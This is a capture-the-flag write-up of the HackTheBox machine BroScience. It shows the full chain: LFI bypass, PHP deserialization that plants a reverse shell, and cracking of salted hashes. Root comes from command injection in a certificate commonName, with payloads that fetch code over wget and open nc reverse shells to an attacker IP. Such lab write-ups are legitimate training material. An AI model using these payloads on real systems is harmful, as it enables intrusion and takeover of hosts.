---
layout: post
title: HTB BroScience
subtitle: BroScience is a medium difficulty Linux machine realeased on HackTheBox.
cover-img: /assets/covers/BroScience.png
share-img: /assets/covers/BroScience.png
tags: [HTB, HackTheBox, Linux, PHP, deserialization, bash, LFI]
comments: true
---

## Recon
Let's start off with nmap scan as per usual:
```bash
❯ nmap 10.10.11.195 -sC -oN broscience.nmap -p-
```
The results:
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-04 21:24 CEST
Nmap scan report for 10.10.11.195
Host is up (0.043s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey: 
|   3072 df17c6bab18222d91db5ebff5d3d2cb7 (RSA)
|   256 3f8a56f8958faeafe3ae7eb880f679d2 (ECDSA)
|_  256 3c6575274ae2ef9391374cfdd9d46341 (ED25519)
80/tcp    open  http
|_http-title: Did not follow redirect to https://broscience.htb/
443/tcp   open  https
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|       secure flag not set and HTTPS in use
|_      httponly flag not set
|_http-title: BroScience : Home
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Not valid before: 2022-07-14T19:48:36
|_Not valid after:  2023-07-14T19:48:36
31337/tcp open  Elite

Nmap done: 1 IP address (1 host up) scanned in 25.42 seconds
```
SSH is open, and the webserver on port 80 redirects to https://broscience.htb, confirmed by open port 443. There is a strange port 31337 open. When connecting to it via nc i notice `SSH-2.0-Go` banner
```bash
❯ nc 10.10.11.195 31337
SSH-2.0-Go
```
I assume this is an SSH server written in Go, but i can't find any details about this so let's leave it alone for now. Let's add the domain information to `/etc/hosts` and check out the website.
## Website
The website seems to be focused on providing information about various exercies.
<img src=/assets/screenshots/htb-broscience/web.png>
There is a login page, and when i try to login with the admin:password credentials, i get a wrong credentials error message
<img src=/assets/screenshots/htb-broscience/incorrect_creds.png height=300px width=600px>

However, when trying admin:admin credentials, i get a different error message, saying the account is not activated
<img src=/assets/screenshots/htb-broscience/not_activated.png height=300px width=600px>

This may mean that admin:admin are the correct credentials, but admin hasn't activated their account yet.

There is not much else to do on the website, so i move on to enumerating URLs with gobuster, using the `raft-small-words` wordlist from seclists, and adding php extension
```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u https://broscience.htb -k -x php -b 403,404 -o index.gobuster
```
```
2023/04/04 22:12:39 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 319] [--> https://broscience.htb/images/]
/includes             (Status: 301) [Size: 321] [--> https://broscience.htb/includes/]
/login.php            (Status: 200) [Size: 1936]
/index.php            (Status: 200) [Size: 33605]
/register.php         (Status: 200) [Size: 2161]
/user.php             (Status: 200) [Size: 1309]
/logout.php           (Status: 302) [Size: 0] [--> /index.php]
/comment.php          (Status: 302) [Size: 13] [--> /login.php]
/styles               (Status: 301) [Size: 319] [--> https://broscience.htb/styles/]
/javascript           (Status: 301) [Size: 323] [--> https://broscience.htb/javascript/]
/.                    (Status: 200) [Size: 33605]
/manual               (Status: 301) [Size: 319] [--> https://broscience.htb/manual/]
/activate.php         (Status: 200) [Size: 1256]
/exercise.php         (Status: 200) [Size: 1322]
/update_user.php      (Status: 302) [Size: 13] [--> /login.php]
```
 There are a few interesting entries:
 - `/includes` directory has directory listing enabled and a bunch of php files in it
 - `/user.php` gives details about a user, such as username and email, when provided with an id parameter
 - `/activate.php` seems to implement the account activation functionality, i need a valid activation code

Since i can't guess the activation code, let's focus on the `includes` directory.

<img src=/assets/screenshots/htb-broscience/includes.png height=300px width=500px>

Most of these files only display a blank page, as they are PHP and get executed when i try to view them. The only exception is the `img.php` file, that returns an error when opened.
```
Error: Missing 'path' parameter.
```
If i leave the path parameter empty, i get an empty 200 response, and when i give it an image name from the `images` directory, it displays the image. This seems like a potential Local File Inclustion(LFI) vulnerability. Trying out a basic LFI payload returns an error
```
❯ curl 'https://broscience.htb/includes/img.php?path=../../../../etc/passwd' -k
<b>Error:</b> Attack detected.
```
A filter appears to prevent me from using `../` to traverse the file system, and absolute paths like `/etc/passwd` don't work either. I try to URL encoding the payload, switching `/` to `\` and the PHP filter `php://filter/convert.base64-encode/path=/etc/passwd` but none of it works. There is an article on [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion#encoding) that suggests double URL encoding the payload, and it works
<img src=/assets/screenshots/htb-broscience/burp-lfi.png>
I will note that there is a user called **bill**, and use this LFI to download all the files i saw in the gobuster scan and the files in the `includes` directory.

## Source code

**includes/db_connect.php**
```php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}
```
This file contains credentials for database connection. I tried to ssh to the user **bill** with the password in this file but was unsuccesful.

**register.php**
```php
include_once 'includes/utils.php';
$activation_code = generate_activation_code();
$res = pg_prepare($db_conn, "check_code_unique_query", 'SELECT id FROM users WHERE activation_code = $1');
$res = pg_execute($db_conn, "check_code_unique_query", array($activation_code));

if (pg_num_rows($res) == 0) {
    $res = pg_prepare($db_conn, "create_user_query", 'INSERT INTO users (username, password, email, activation_code) VALUES ($1, $2, $3, $4)');
    $res = pg_execute($db_conn, "create_user_query", array($_POST['username'], md5($db_salt . $_POST['password']), $_POST['email'], $activation_code));

    // TODO: Send the activation link to email
    $activation_link = "https://broscience.htb/activate.php?code={$activation_code}";

    $alert = "Account created. Please check your email for the activation link.";
}
```
When a user registers, the `generate_activation_code()` function is called, and its result is stored in the database. I will also note the format of the activation link.

**includes/utils.php**
```php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
```
This is vulnerable to a timing attack since the PHP `time()` function returns the number of seconds since January 1 1970 00:00:00 GMT. I can use this function to generate a code and make a request to register a user. If this happens within one second, i should get the same activation code and manage to activate my account.

## Initial access
PHP on Kali linux is compiled without the `curl` library, and that makes it complicated to make http requests, i will hovewer use a python script and call the php function from it
```python
import random
import subprocess
import requests

# add random numbers to make sure username is unique
username = f"jan{random.randint(0, 1000)}"
password= "password"
data = {
    "username": username,
    "email": f"{username}@broscience.htb",
    "password": password,
    "password-confirm": password
}
# get the activation code
code = subprocess.check_output(["php", "generate_code.php"]).decode()

# register
requests.post("https://broscience.htb/register.php",data=data, verify=False)

activation_url = f"https://broscience.htb/activate.php?code={code}"

print(f"Username: {username}, password: {password}, activation link: {activation_url}")
```

When i run the code
```
❯ python3 activate.py                                                                                                         
Username: jan508, password: password, activation link: https://broscience.htb/activate.php?code=XiNoXaVh5J7VxFDdMPlEqFNu9ioPqhjU
```

When i click the activation url, i get a success message, and i can login to the application with the provided credentials.

<img src=/assets/screenshots/htb-broscience/web-logged.png>
Not much changed on the website, except i can now write comments on the posts and switch to a dark theme. I tried to do some SQL injection in the comments, but it didn't work, and i even have the source code to see that it is not really vulnerable.

I look at the code that provides the theme switching functionality, and it does deserialization on user-provided input, which is always dangerous.
```php
class UserPrefs {
    public $theme;

    public function __construct($theme = "light") {
		$this->theme = $theme;
    }
}

function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}
```
This code gets the value of `user-prefs` cookie, decodes it, and creates a `UserPrefs` object from it. There is a lot of information on how to exploit PHP deserialization, and i chose to follow [this](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a) article. It mentions two 'magic' methods, `__wakeup()` and `__destruct()`. When unserialize is called on an object, these methods will always get executed. If there is a class that implements thse methods, i might be able to abuse it. And there is one such class, `AvatarInterface`.
```php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
```
So, what happens when unserialize is called on an `AvatarInterface` object? It creates an instance of the `Avatar` object and then calls that object's `save` method. This method then reads a file and writes its contents to another file. Since `file_get_contents` [can](https://www.php.net/manual/en/function.file-get-contents.php) read remote files and i control the path to this file, i can make it read a file with PHP reverse shell and save it on the webserver!
The attack looks like this:
1. Start a netcat listener on port 9999
```
❯ nc -lvnp 9999
listening on [any] 9999 ...
```
2. Create the file with reverse shell payload and start a web server to host it
```
❯ echo '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.169 9999 >/tmp/f"); ?>' > payload
❯ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
3. Generate the malicious object
```php
$avatar = new AvatarInterface();
$avatar->tmp = "http://10.10.14.169:8000/payload";
$avatar->imgPath = "rev.php";
$payload = base64_encode(serialize($avatar));
echo $payload;
```
4. Go to the website, change the value of `user-prefs` cookie to payload generated in step 3, and refresh. I see the file was downloaded from the webserver
```
❯ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.195 - - [05/Apr/2023 10:57:20] "GET /payload HTTP/1.0" 200 -
10.10.11.195 - - [05/Apr/2023 10:57:20] "GET /payload HTTP/1.0" 200 -
10.10.11.195 - - [05/Apr/2023 10:57:20] "GET /payload HTTP/1.0" 200 -
```
5. Visit https://broscience.htb/rev.php and get a callback on the netcat listener!!!
```
❯ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.169] from (UNKNOWN) [10.10.11.195] 40876
sh: 0: can't access tty; job control turned off
$ id  
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```
## Privilege escalation
First, let's upgrade to a proper shell
```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
www-data@broscience:/var/www/html$ ^Z
[1]  + 57720 suspended  nc -lvnp 9999

~/Blog/HTB/BroScience main* 17m 11s ❯ stty raw -echo; fg
[1]  + 57720 continued  nc -lvnp 9999

www-data@broscience:/var/www/html$ stty rows 52 cols 229
www-data@broscience:/var/www/html$ export TERM=xterm
```
I'm the `www-data` user since this user started the website process. There is one other user, bill. First, i am going to check out the database to see if it has some credentials for bill. I have the connection information from the `database_connect.php` file, and since it's using a `pg_connect()` function, i know its PostgreSQL databse.
```
www-data@broscience:/$ /usr/bin/psql -U dbuser -h localhost -d broscience -W 
Password: 
psql (13.9 (Debian 13.9-0+deb11u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

broscience=> \dt
           List of relations
 Schema |   Name    | Type  |  Owner   
--------+-----------+-------+----------
 public | comments  | table | postgres
 public | exercises | table | postgres
 public | users     | table | postgres
(3 rows)

broscience=> select * from users;
 id |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_created          
----+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+-------------------------------
  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05
  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04
  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04
  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04
  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04
(5 rows)

broscience=>
```
I get a few usernames, and their MD5 hashes, the interesting ones are **bill** and **administrator**. I try to crack these hashes with hashcat and the rockyou wordlist, but it fails. After a while, i realized that the database has a salt
```php
$db_salt = "NaCl";
```
and this salt is used when a user registers
```php
$res = pg_execute($db_conn, "create_user_query", array($_POST['username'], md5($db_salt . $_POST['password']), $_POST['email'], $activation_code));
```
Looking at hashcat [example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes), there is a hash that has the format i need
| Hash-Mode  |      Hash-Name     |                    Example                    |   |   |
|:----------:|:------------------:|:---------------------------------------------:|---|---|
| 20         |  md5($salt.$pass)  |  f0fda58630310a6dd91a7d8f0a4ceda2:4225637426  |   |   |

I edit the hashes to the correct format
```bash
❯ cat hashes
administrator:15657792073e8a843d4f91fc403454e1:NaCl
bill:13edad4932da9dbb57d9cd15b66ed104:NaCl
```
and start hashcat
```bash
❯ hashcat -m 20 --username hashes /usr/share/wordlists/rockyou.txt
```
and i get a password for bill.
```
❯ hashcat -m 20 --username hashes --show
bill:13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym
```
I can switch to the bill user now and get the flag.
```bash
www-data@broscience:/$ su bill
Password: 
bill@broscience:/$ id
uid=1000(bill) gid=1000(bill) groups=1000(bill)
bill@broscience:/$ cat ~/user.txt 
ad8c31e7346aead9347e843ab77a9c4f
```
## Root
There is a non-standard directory in bill's home, called Certs.
```bash
bill@broscience:~$ ls
Certs  Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
```
In /opt, there is `renew_cert.sh` script, which might be connected to it.
```bash
bill@broscience:/opt$ ls
renew_cert.sh
```
I will use [pspy](https://github.com/DominicBreuker/pspy), a tool for process dumping, and see that this script is run by root every 2 minutes.
```bash
2023/04/05 09:40:01 CMD: UID=0     PID=6861   | timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt
```
Judging by the above, i will focus on the `renew_cert.sh` script. The script is quite long, but i will go over the important parts:
```bash
openssl x509 -in $1 -noout -checkend 86400 > /dev/null
    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi
```
According to openssl documentation, the *-checkend arg* flag
>Checks if the certificate expires within the next arg seconds and exits nonzero if yes it will expire or zero if not.

86400 seconds is one day, so in order to pass this check the certificate must expire in less than a day. If the certificate passes this check, it gets its subject and parses variables from it:
```bash
subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)
country=$(echo $subject | grep -Eo 'C = .{2}')
commonName=$(echo $subject | grep -Eo 'CN = .*,?')
...
```
When this is done, it creates a new certificate with these variables:
```bash
openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
    $state
    ...
```
And lastly, it moves the cerificate to bill's home directory:
```bash
/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
```
This last command is interesting because it executes a command where i control a part of it (the `commonName` variable). I can abuse this by putting a semicolon character in the `commonName` variable. A sample payload that executes the `id` command:
```bash
commonName="certname;id;"
```
The second semicolon is necessary since the script adds the `.crt` extension to the certificate name, and it would break the command.

After the variable substitution, the final command will look like this:
```bash
/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/certname;id;.crt"
```
I can test on my local machine that this exploit indeed works.

Now let's get the root shell! First, i will setup a listener to catch the reverse shell:
```bash
nc -lvnp 9999
listening on [any] 9999 ...
```
Now move over to the vulnerable machine and create the malicious certificate. Few things to remember:
- The certificate needs to be located at `/home/bill/Certs/broscience.crt`.
- The certificate needs to expire in less than a day when the script runs.
When creating the certificate, i ran into an issue:
```
Common Name (e.g. server FQDN or YOUR name) []:whatever;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.169 9999 >/tmp/f;
string is too long, it needs to be no more than 64 bytes long
```
The payload is too long. I can deal with this by hosting the payload on a web server:
```bash
❯ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.169 9999 >/tmp/f' > x
❯ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Then get the payload using curl:
```bash
Common Name (e.g. server FQDN or YOUR name) []:whatever;curl 10.10.14.169:8000/x|bash;
```
Openssl accepts this, however, i don't get a callback. When trying out the payload manually, i notice 2 flaws:
- Due to the parsing of the variables, bash interprets the `commonName` variable as a string and the command doesn't get executed. I can bypass this by enclosing the payload in `$()`. When `$()` appers in a string, bash executes the command inside the brackets and replaces `$()` with the command result.
- There is no `curl` command on the machine, however, there is `wget`, so i can use that instead.
The final exploit looks like this:
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out broscience.crt -sha256 -days 1
...
Common Name (e.g. server FQDN or YOUR name) []:$(wget 10.10.14.169:8000/x -O x;bash x)
...
```
This works, and i get a shell as root, but it crashes after a few seconds. I think it's probably because of the `timeout` command in the cronjob. To deal with this, i will use differnet payload. This time, i will add the setuid permissions to bash:
```bash
$(chmod u+s /bin/bash)
```
After two minutes, i check `bash` and see that it has the setuid bit set. Ican use it to get root shell.
```
bill@broscience:~/Certs$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
bill@broscience:~/Certs$ bash -p
bash-5.1# id
uid=1000(bill) gid=1000(bill) euid=0(root) groups=1000(bill)
bash-5.1# cat /root/root.txt 
78f4458060020f3abfa97d510a983a6c
```

## Fixing the vulnerability
I gained initial access because the code was vulnerable to LFI. This is the vulnerable code:
```php
<?php
if (!isset($_GET['path'])) {
    die('<b>Error:</b> Missing \'path\' parameter.');
}

// Check for LFI attacks
$path = $_GET['path'];

$badwords = array("../", "etc/passwd", ".ssh");
foreach ($badwords as $badword) {
    if (strpos($path, $badword) !== false) {
        die('<b>Error:</b> Attack detected.');
    }
}

// Normalize path
$path = urldecode($path);

// Return the image
header('Content-Type: image/png');
echo file_get_contents('/var/www/html/images/' . $path);
?>
```
It first looks for 'bad words' inside the path parametr and exits if it contains any of them. It will URL decode the path and return the file if it doesn't. The issue is that PHP URL decodes the elements in `$_GET` [automatically](https://www.php.net/manual/en/function.urldecode.php#refsect1-function.urldecode-notes). So when i sent the application a double URL encoded payload, PHP applied the first decoding, but `$path` was still URL encoded once. Therefore it looked like this '%20%35....' and the check for bad words passed. But then the second decoding was applied, and `$path` was in plain text form appended to the file path.
To fix this, we can:
- Perform the URL decoding (if necessary) before checking for LFI attacks or
- don't do the decoding at all since PHP decoded the request on its own.